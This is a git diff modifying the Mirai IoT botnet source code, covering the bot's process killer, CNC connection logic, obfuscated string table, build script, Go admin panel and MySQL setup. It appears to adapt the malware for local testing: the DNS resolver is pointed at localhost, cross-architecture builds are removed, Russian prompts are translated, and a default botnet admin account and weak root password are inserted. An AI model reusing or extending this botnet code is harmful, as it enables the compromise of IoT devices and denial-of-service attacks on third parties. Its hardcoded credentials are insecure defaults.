diff --git a/mirai/bot/includes.h b/mirai/bot/includes.h
index 63eeeb6..b10f2ce 100755
--- a/mirai/bot/includes.h
+++ b/mirai/bot/includes.h
@@ -28,7 +28,7 @@ typedef uint16_t port_t;
 #define CNC_OP_PROXY        0x30
 #define CNC_OP_ATTACK       0x40
 
-ipv4_t LOCAL_ADDR;
+extern ipv4_t LOCAL_ADDR;
 
 #ifdef DEBUG
 static char *outptr;
@@ -129,5 +129,33 @@ static void xprintf(const char *fmt, ...)
 }
 #define printf xprintf
 
+static inline char* ipstr(ipv4_t ip)
+{
+    static char buf[20], tmp[8];
+    int i, j, k, o;
+    j = 0;
+    for (i = 0; i < 32; i += 8) {
+        if (i > 0) {
+            buf[j++] = '.';
+        }
+        o = (ip >> i) & 0xFF;
+        if (o == 0) {
+            buf[j++] = '0';
+        } else {
+            k = 0;
+            while (o > 0) {
+                tmp[k++] = '0' + (o % 10);
+                o /= 10;
+            }
+            --k;
+            while (k >= 0) {
+                buf[j++] = tmp[k--];
+            }
+        }
+    }
+    buf[j] = '\0';
+    return buf;
+}
+
 #endif
 
diff --git a/mirai/bot/killer.c b/mirai/bot/killer.c
index db1860c..716a967 100755
--- a/mirai/bot/killer.c
+++ b/mirai/bot/killer.c
@@ -170,6 +170,7 @@ void killer_init(void)
 
             table_unlock_val(TABLE_KILLER_PROC);
             table_unlock_val(TABLE_KILLER_EXE);
+            table_unlock_val(TABLE_KILLER_STATUS);
 
             // Store /proc/$pid/exe into exe_path
             ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
@@ -183,6 +184,7 @@ void killer_init(void)
 
             table_lock_val(TABLE_KILLER_PROC);
             table_lock_val(TABLE_KILLER_EXE);
+            table_lock_val(TABLE_KILLER_STATUS);
 
             // Resolve exe_path (/proc/$pid/exe) -> realpath
             if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)
diff --git a/mirai/bot/killer.h b/mirai/bot/killer.h
index 7e2b657..309e70b 100755
--- a/mirai/bot/killer.h
+++ b/mirai/bot/killer.h
@@ -5,7 +5,7 @@
 #define KILLER_MIN_PID              400
 #define KILLER_RESTART_SCAN_TIME    600
 
-#define KILLER_REBIND_TELNET
+// #define KILLER_REBIND_TELNET
 // #define KILLER_REBIND_SSH
 // #define KILLER_REBIND_HTTP
 
diff --git a/mirai/bot/main.c b/mirai/bot/main.c
index 8c0510f..1b3f8c1 100755
--- a/mirai/bot/main.c
+++ b/mirai/bot/main.c
@@ -14,6 +14,7 @@
 #include <sys/ioctl.h>
 #include <time.h>
 #include <errno.h>
+#include <string.h>
 
 #include "includes.h"
 #include "table.h"
@@ -23,6 +24,7 @@
 #include "scanner.h"
 #include "util.h"
 #include "resolv.h"
+ipv4_t LOCAL_ADDR;
 
 static void anti_gdb_entry(int);
 static void resolve_cnc_addr(void);
@@ -261,13 +263,14 @@ int main(int argc, char **args)
 
                     LOCAL_ADDR = util_local_addr();
                     send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
+                    sleep(1);
                     send(fd_serv, &id_len, sizeof (id_len), MSG_NOSIGNAL);
                     if (id_len > 0)
                     {
                         send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                     }
 #ifdef DEBUG
-                    printf("[main] Connected to CNC. Local address = %d\n", LOCAL_ADDR);
+                    printf("[main] Connected to CNC. fd_serv=%d, Local address = %s\n", fd_serv, ipstr(LOCAL_ADDR));
 #endif
                 }
             }
@@ -293,7 +296,7 @@ int main(int argc, char **args)
             if (n == 0)
             {
 #ifdef DEBUG
-                printf("[main] Lost connection with CNC (errno = %d) 1\n", errno);
+                printf("[main] Lost connection with CNC (errno = %d %s) 1\n", errno, strerror(errno));
 #endif
                 teardown_connection();
                 continue;
@@ -327,7 +330,7 @@ int main(int argc, char **args)
             if (n == 0)
             {
 #ifdef DEBUG
-                printf("[main] Lost connection with CNC (errno = %d) 2\n", errno);
+                printf("[main] Lost connection with CNC (errno = %d %s) 2\n", errno, strerror(errno));
 #endif
                 teardown_connection();
                 continue;
@@ -377,7 +380,7 @@ static void resolve_cnc_addr(void)
     table_lock_val(TABLE_CNC_PORT);
 
 #ifdef DEBUG
-    printf("[main] Resolved domain\n");
+    printf("[main] Resolved CNC at %s:%d\n", ipstr(srv_addr.sin_addr.s_addr), ntohs(srv_addr.sin_port));
 #endif
 }
 
diff --git a/mirai/bot/resolv.c b/mirai/bot/resolv.c
index ea1f62d..b7dc633 100755
--- a/mirai/bot/resolv.c
+++ b/mirai/bot/resolv.c
@@ -81,8 +81,8 @@ struct resolv_entries *resolv_lookup(char *domain)
 
     util_zero(&addr, sizeof (struct sockaddr_in));
     addr.sin_family = AF_INET;
-    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
-    addr.sin_port = htons(53);
+    addr.sin_addr.s_addr = INET_ADDR(127,0,0,1);
+    addr.sin_port = htons(55);
 
     // Set up the dns query
     dnsh->id = dns_id;
diff --git a/mirai/bot/table.c b/mirai/bot/table.c
index 13b341e..18ffc79 100755
--- a/mirai/bot/table.c
+++ b/mirai/bot/table.c
@@ -15,10 +15,10 @@ struct table_value table[TABLE_MAX_KEYS];
 
 void table_init(void)
 {
-    add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 30); // cnc.changeme.com
+    add_entry(TABLE_CNC_DOMAIN, "NMACNJMQV\"", 10); // cnc.changeme.com
     add_entry(TABLE_CNC_PORT, "\x22\x35", 2);   // 23
 
-    add_entry(TABLE_SCAN_CB_DOMAIN, "\x50\x47\x52\x4D\x50\x56\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 29); // report.changeme.com
+    add_entry(TABLE_SCAN_CB_DOMAIN, "NMACNJMQV\"", 10); // report.changeme.com
     add_entry(TABLE_SCAN_CB_PORT, "\x99\xC7", 2);         // 48101
 
     add_entry(TABLE_EXEC_SUCCESS, "\x4E\x4B\x51\x56\x47\x4C\x4B\x4C\x45\x02\x56\x57\x4C\x12\x22", 15);
diff --git a/mirai/build.sh b/mirai/build.sh
index 51afd44..25720de 100755
--- a/mirai/build.sh
+++ b/mirai/build.sh
@@ -1,4 +1,5 @@
 #!/bin/bash
+set -ex
 
 FLAGS=""
 
@@ -49,10 +50,6 @@ elif [ "$1" == "release" ]; then
     go build -o release/scanListen tools/scanListen.go
 elif [ "$1" == "debug" ]; then
     gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/mirai.dbg
-    mips-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.mips
-    armv4l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm
-    armv6l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm7
-    sh4-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.sh4
     gcc -std=c99 tools/enc.c -g -o debug/enc
     gcc -std=c99 tools/nogdb.c -g -o debug/nogdb
     gcc -std=c99 tools/badbot.c -g -o debug/badbot
diff --git a/mirai/cnc/admin.go b/mirai/cnc/admin.go
index 28a2091..7f83d81 100755
--- a/mirai/cnc/admin.go
+++ b/mirai/cnc/admin.go
@@ -5,7 +5,6 @@ import (
     "net"
     "time"
     "strings"
-    "io/ioutil"
     "strconv"
 )
 
@@ -25,17 +24,13 @@ func (this *Admin) Handle() {
         this.conn.Write([]byte("\033[?1049l"))
     }()
 
-    headerb, err := ioutil.ReadFile("prompt.txt")
-    if err != nil {
-        return
-    }
 
-    header := string(headerb)
+    header := "MIRAI\n"
     this.conn.Write([]byte(strings.Replace(strings.Replace(header, "\r\n", "\n", -1), "\n", "\r\n", -1)))
 
     // Get username
     this.conn.SetDeadline(time.Now().Add(60 * time.Second))
-    this.conn.Write([]byte("\033[34;1mпользователь\033[33;3m: \033[0m"))
+    this.conn.Write([]byte("\033[34;1mUsername: \033[0m"))
     username, err := this.ReadLine(false)
     if err != nil {
         return
@@ -43,7 +38,7 @@ func (this *Admin) Handle() {
 
     // Get password
     this.conn.SetDeadline(time.Now().Add(60 * time.Second))
-    this.conn.Write([]byte("\033[34;1mпароль\033[33;3m: \033[0m"))
+    this.conn.Write([]byte("\033[34;1mPassword: \033[0m"))
     password, err := this.ReadLine(true)
     if err != nil {
         return
@@ -53,15 +48,15 @@ func (this *Admin) Handle() {
     this.conn.Write([]byte("\r\n"))
     spinBuf := []byte{'-', '\\', '|', '/'}
     for i := 0; i < 15; i++ {
-        this.conn.Write(append([]byte("\r\033[37;1mпроверив счета... \033[31m"), spinBuf[i % len(spinBuf)]))
+        this.conn.Write(append([]byte("\r\033[37;1mLogging in... \033[31m"), spinBuf[i % len(spinBuf)]))
         time.Sleep(time.Duration(300) * time.Millisecond)
     }
 
     var loggedIn bool
     var userInfo AccountInfo
     if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
-        this.conn.Write([]byte("\r\033[32;1mпроизошла неизвестная ошибка\r\n"))
-        this.conn.Write([]byte("\033[31mнажмите любую клавишу для выхода. (any key)\033[0m"))
+        this.conn.Write([]byte("\r\033[32;1mUnknown error occurred!\r\n"))
+        this.conn.Write([]byte("\033[31mPress any key to exit.\033[0m"))
         buf := make([]byte, 1)
         this.conn.Read(buf)
         return
diff --git a/scripts/db.sql b/scripts/db.sql
index 6d873dc..fc660c6 100644
--- a/scripts/db.sql
+++ b/scripts/db.sql
@@ -1,4 +1,5 @@
 CREATE DATABASE mirai;
+USE mirai;
 
 CREATE TABLE `history` (
   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
@@ -34,3 +35,6 @@ CREATE TABLE `whitelist` (
   PRIMARY KEY (`id`),
   KEY `prefix` (`prefix`)
 );
+INSERT INTO users VALUES (NULL, 'm1r41', 'p455w', 0, 0, 0, 0, -1, 1, 30, '');
+SET PASSWORD for 'root'@'localhost' = PASSWORD('password');
+FLUSH PRIVILEGES;
